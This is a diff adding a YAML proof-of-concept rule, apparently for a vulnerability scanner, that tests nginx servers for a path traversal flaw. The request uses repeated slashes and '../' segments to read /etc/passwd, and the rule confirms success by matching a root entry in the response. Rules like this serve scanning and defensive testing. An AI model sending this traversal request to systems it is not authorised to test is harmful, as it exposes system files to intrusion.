@@ -1,0 +1,17 @@
+name: poc-yaml-nginx-path-traversal
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            method: GET
+            path: "///////../../../etc/passwd"
+            follow_redirects: false
+        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+
+expression: r0()
+
+detail:
+    author: kzaopa(https://github.com/kzaopa)
+    links:
+        - https://medium.com/@0nlymohammed/nginx-merge-slashes-path-traversal-bc3793fc1594
